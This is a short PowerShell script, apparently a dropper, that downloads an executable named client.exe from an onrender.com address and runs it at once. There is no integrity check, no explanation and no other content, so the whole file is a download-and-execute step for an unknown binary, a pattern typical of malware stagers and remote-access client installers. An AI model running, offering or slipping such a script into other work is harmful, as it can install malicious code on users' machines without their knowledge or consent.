Write-Output "Downloading..."
Invoke-WebRequest -Uri "https://shratcacs.onrender.com/files/client.exe" -OutFile "client.exe"
Write-Output "Running..."
.\client.exe